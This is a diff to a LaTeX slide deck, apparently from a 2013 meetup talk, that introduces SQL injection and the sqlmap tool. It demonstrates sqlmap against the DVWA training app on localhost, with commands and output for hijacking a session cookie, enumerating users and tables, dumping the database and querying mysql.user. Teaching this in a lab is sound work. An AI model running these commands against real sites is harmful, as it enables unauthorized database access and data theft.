@@ -19,10 +19,10 @@
 
 \begin{document}
 
-\title{SQLMap 101}
+\title{sqlmap 101}
 \subtitle{Detect and Exploit SQL Injection}
 \author{Zaki Akhmad}
-\institute{{\href{http://www.indocisc.co.id}{indocisc}}}
+\institute[Python ID Meetup]{Python Indonesia Meetup}
 \date{February 23, 2013}
 
 \begin{frame}
@@ -36,7 +36,7 @@
 %		\tableofcontents
 %\end{frame}
 
-\section{About Me}
+%\section{About Me}
 
 \begin{frame}
 	\frametitle{}
@@ -95,10 +95,293 @@
 	\end{center}
 \end{frame}
 
-%\section{SQL Injection from xckd}
-%	
-%\section{SQLMap}
+\begin{frame}
+	\begin{center}
+		\LARGE{SQL Injection}
+	\end{center}
+\end{frame}
+
+\begin{frame}
+%	\frametitle{Exploits of a Mom, XKCD \#327}	
+	\begin{center}
+		\href{http://xkcd.com/327/}{\includegraphics[width=10cm]{exploits_of_a_mom.png}}\\
+		Exploits of a Mom, XKCD \#327
+	\end{center}
+\end{frame}
+
+\begin{frame}
+	\begin{center}
+		\large{SQL Injection is (mostly) about \\ \color{red}{the unauthorized DBMS data access}}\\
+		\small{Miroslav Stampar, sqlmap Developer}
+	\end{center}
+\end{frame}
+
+\begin{frame}
+	\begin{center}
+		\LARGE{SQL Injection techniques:}	
+	\end{center}
+	\begin{itemize}
+		\item Blind
+		\item Error
+		\item Union (partial and full)
+		\item Time
+		\item Stacked
+	\end{itemize}
+	\begin{flushright}\small{\textit{... sqlmap 102}}\end{flushright}
+\end{frame}
+
+\begin{frame}
+	\begin{center}
+		\LARGE{What's sqlmap} \vskip.5cm
+		\small{\textit{open source penetration testing	tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database server(s)}}
+	\end{center}
+\end{frame}
+
+\begin{frame}
+	\begin{center}
+		\underline{sqlmap Project Details} \vskip.2cm
+		
+		\begin{columns}
+		\column{.3\textwidth}
+		\begin{flushright}	
+		repository \\ 
+		web \\	
+		twitter \\ 
+		contact \\
+		mailing list \\
+		\end{flushright}
+		\column{.7\textwidth}
+		\begin{flushleft}
+		\href{https://github.com/sqlmapproject/sqlmap}{https://github.com/sqlmapproject/sqlmap}\\
+		\href{http://sqlmap.org}{http://sqlmap.org} \\
+		\href{https://twitter.com/sqlmap}{@sqlmap}\\
+		dev at sqlmap.org \\
+		sqlmap-users at lists.sourceforge.net \\
+		\end{flushleft}
+		\end{columns}
+
+	\end{center}
+\end{frame}
+
+\begin{frame}
+	\begin{center}
+	\LARGE{Project Statistic} \vskip.2cm
+	\includegraphics[width=10cm]{ohloh.png} \\
+	\small{\href{http://www.ohloh.net/p/sqlmap}{http://www.ohloh.net/p/sqlmap}}
+	\end{center}
+\end{frame}
+
+\begin{frame}
+	\begin{center} 
+	\underline{Get and Update sqlmap}\vskip.3cm
+	\end{center}
+	\begin{columns}	
+	\column{.1\textwidth}
+	\column{.9\textwidth}
+	\textrm{\$ git clone https://github.com/sqlmapproject/sqlmap.git} \\
+	\textrm{\$ python sqlmap.py --update}
+	\end{columns}
+\end{frame}
+
+\begin{frame}
+	\begin{center}
+	\LARGE{\href{http://www.dvwa.co.uk}{DVWA as an Example}}
+	\end{center}
+\end{frame}
+
+\begin{frame}[fragile]
+	\begin{center}
+	Find Entry Point \\
+	%\begin{columns}	
+	%\column{.1\textwidth}
+	%\column{.9\textwidth}
+	%\small{	
+	\small \begin{verbatim}
+			$ python sqlmap.py -u 
+			http://localhost/dvwa/vulnerabilities/sqli/?id=&Submit=Submit 
+			\end{verbatim} \\
+	\begin{verbatim}
+	[13:27:54] [INFO] testing connection to the target url
+	[13:27:54] [INFO] heuristics detected web page charset 'None'
+	sqlmap got a 302 redirect to 'http://localhost:80/dvwa/login.php'. 
+	Do you want to follow? [Y/n]
+	\end{verbatim}
+	%\end{columns}
+	
+	\end{center}
+\end{frame}
+
+\begin{frame}[fragile]
+	\begin{center}
+		So, We Need a Cookie	
+	\end{center}
+	\small 
+	\begin{verbatim}
+	$ ./sqlmap.py 
+	--cookie 
+	"PHPSESSID=1gn63kn3opj97l6325h0f9sjn2; 
+	 security=low" 
+	-u "http://localhost/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit"
+	\end{verbatim}	
+\end{frame}
+
+\begin{frame}
+	\begin{center}
+	sqlmap Result \vskip.5cm
+	\includegraphics[width=10cm]{sqlmap-result.png}
+	\end{center}
+	%\small
+	%\begin{verbatim}
+	%\end{verbatim} 
+\end{frame}
+
+\begin{frame}
+	\begin{center}
+	sqlmap Result \vskip.5cm
+	\includegraphics[width=10cm]{sqlmap-fingerprint.png}
+	\end{center}
+	%\small
+	%\begin{verbatim}
+	%\end{verbatim} 
+\end{frame}
+
+%\begin{frame}[fragile]
+%	\begin{center}
+%		\LARGE Enumeration\vskip.3cm	
+%	\end{center}
+%	\begin{columns}	
+%	\column{.3\textwidth}
+%	\begin{flushright}
+%	\begin{semiverbatim}
+%	-a, --all 
+%	--current-user
+%	--current-db
+%	--passwords
+%	--tables
+%	--dump
+%	...
+%	\end{semiverbatim}
+%	\end{flushright} 
+%	\column{.7\textwidth}
+%	\begin{flushleft}	
+%	Retrieve everything\\
+%	Retrieve DBMS current user\\
+%	Retrieve DBMS current database\\
+%	Enumerate DBMS users password hashes\\
+%	Enumerate DBMS database tables\\
+%	Dump DBMS database table entries\\
+%	... and many more
+%	\end{flushleft}
+%	\end{columns}
 %
-%\subsection{Yes, it's Python!}
+%\end{frame}
+
+\begin{frame}[fragile]
+	\begin{center}
+	\LARGE Enumeration
+	\end{center}
+	\begin{columns}	
+	\column{.1\textwidth}
+	\column{.9\textwidth}
+	\textrm{\$ python sqlmap.py -u ... --cookie ... \color{red}{--current-user}}\vskip.3cm
+	\textrm{[15:17:35] [INFO] fetching current user current user: 'root@localhost'}
+	\end{columns}
+\end{frame}
+
+\begin{frame}[fragile]
+	\begin{center}
+	\LARGE Enumeration
+	\end{center}
+	\begin{columns}	
+	\column{.1\textwidth}
+	\column{.9\textwidth}
+	\textrm{\$ python sqlmap.py -u ... --cookie ... \color{red}{--tables}}\vskip.3cm
+	\textrm{[14:45:32] [INFO] fetching tables for databases: 'dvwa, mysql'}
+	\end{columns}
+\end{frame}
+
+\begin{frame}
+	\begin{center}
+	Enumeration \vskip.5cm
+	\includegraphics[width=5cm]{sqlmap-tables.png}
+	\end{center}
+	%\small
+	%\begin{verbatim}
+	%\end{verbatim} 
+\end{frame}
+
+\begin{frame}[fragile]
+	\begin{center}
+	\LARGE Enumeration
+	\end{center}
+	\begin{columns}	
+	\column{.1\textwidth}
+	\column{.9\textwidth}
+	\textrm{\$ python sqlmap.py -u ... --cookie ... \color{red}{--dump} DVWA}\vskip.3cm
+	\end{columns}
+\end{frame}
+
+\begin{frame}
+	\begin{center}
+	Enumeration \vskip.5cm
+	\includegraphics[width=10cm]{sqlmap-dvwa.png}
+	\end{center}
+	%\small
+	%\begin{verbatim}
+	%\end{verbatim} 
+\end{frame}
+
+\begin{frame}
+	\begin{center}
+		\LARGE \href{https://github.com/sqlmapproject/sqlmap/commit/b483710927fdc878e276fea26fccff0b986ebd40}{Contribution}\vskip.5cm
+	\end{center}
+	\begin{columns}	
+	\column{.1\textwidth}
+	\column{.9\textwidth}
+	\underline{Feature request}\vskip.3cm
+	1. Configure output directory \\
+	2. Retrieve database server IP address \\
+	\end{columns}
+\end{frame}
+
+\begin{frame}[fragile]
+	\begin{center}
+	\LARGE Enumeration
+	\end{center}
+	\begin{columns}	
+	\column{.1\textwidth}
+	\column{.9\textwidth}
+	\begin{verbatim}	
+	$ python sqlmap.py -u ... --cookie ... 
+	--sql-query=
+	  "SELECT host, user FROM mysql.user 
+	  WHERE user LIKE '%root%' OR user LIKE '%admin%'"
+	
+	SELECT host, user FROM mysql.user 
+	  WHERE user LIKE '%root%' OR user LIKE '%admin%' [4]:
+	[*] 127.0.0.1, root
+	[*] localhost, phpmyadmin
+	[*] localhost, root
+	[*] zara, root
+
+	\end{verbatim}
+	\end{columns}
+\end{frame}
+
+\begin{frame}
+	\begin{center}
+		\LARGE{Reference} \\
+	\end{center}
+	\begin{itemize}
+		\item \href{http://www.slideshare.net/stamparm/euro-python-2011miroslavstamparsqlmapsecuritydevelopmentinpython}{sqlmap - security development in python, Miroslav Stampar, EuroPython 2011}
+	
+	\end{itemize}	
+\end{frame}
+
+\begin{frame}
+\begin{center}
+\LARGE \textrm{.finish}
+\end{center}
+\end{frame}	
 
 \end{document}
